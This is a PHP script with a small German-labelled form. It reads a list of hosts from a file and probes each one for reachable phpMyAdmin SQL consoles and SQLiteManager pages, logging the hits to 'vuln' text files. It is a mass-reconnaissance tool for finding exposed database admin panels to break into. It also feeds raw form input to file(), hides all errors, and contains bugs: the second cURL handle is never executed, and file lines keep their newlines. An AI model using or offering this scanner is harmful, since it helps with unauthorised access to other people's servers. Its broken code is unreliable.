<form method="post" action="scan_pma.php">
    <input type="text" name="textdatei" />
    <input type="submit" name="scanpma" value="Auf PMA checken" />
    <input type="submit" name="scansqlite" value="Auf SQLite checken" />
</form>
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '256M');
ini_set('display_errors', 0);
ini_set('max_execution_time', 0);
/**
 * Created by JetBrains PhpStorm.
 * User: styles
 * Date: 06.09.19
 * Time: 19:38
 * To change this template use File | Settings | File Templates.
 */
function Scan4PMA($textdatei){
  $file_lines = file("$textdatei");
    foreach($file_lines as $line){
        $url = $line."/phpmyadmin/server_sql.php";
        // Use curl_init() function to initialize a cURL session
        $curl = curl_init($url);

// Use curl_setopt() to set an option for cURL transfer
        curl_setopt($curl, CURLOPT_NOBODY, true);

// Use curl_exec() to perform cURL session
        $result = curl_exec($curl);

        if ($result !== false) {

            // Use curl_getinfo() to get information
            // regarding a specific transfer
            $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
            if ($statusCode == 200)
            {
                $file = fopen("vuln_pma.txt","a");
                fwrite($file,"$url\r\n");
                fclose($file);
            }
        }
    }
}
function Scan4SQLite($textdatei){
    $file_lines = file("$textdatei");
    foreach($file_lines as $line){
        $url = $line."/sqlitemanager/main.php";
        $url2 = $line."/sqlite/main.php";
        // Use curl_init() function to initialize a cURL session
        $curl = curl_init($url);
        $curl2 = curl_init($url2);

// Use curl_setopt() to set an option for cURL transfer
        curl_setopt($curl, CURLOPT_NOBODY, true);
        curl_setopt($curl2, CURLOPT_NOBODY, true);

// Use curl_exec() to perform cURL session
        $result = curl_exec($curl);
        $result2 = curl_exec($curl);

        if ($result !== false) {

            // Use curl_getinfo() to get information
            // regarding a specific transfer
            $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
            if ($statusCode == 200)
            {
                $file = fopen("vuln_sqlite.txt","a");
                fwrite($file,"$url\r\n");
                fclose($file);
            }
        }elseif($result2 !== false){
            $statusCode = curl_getinfo($curl2, CURLINFO_HTTP_CODE);
            if ($statusCode == 200)
            {
                $file = fopen("vuln_sqlite.txt","a");
                fwrite($file,"$url2\r\n");
                fclose($file);
            }
        }
    }
}
if(isset($_POST['scanpma'])){
    Scan4PMA($_POST['textdatei']);
}elseif(isset($_POST['scansqlite'])){
    Scan4SQLite($_POST['textdatei']);
}

?>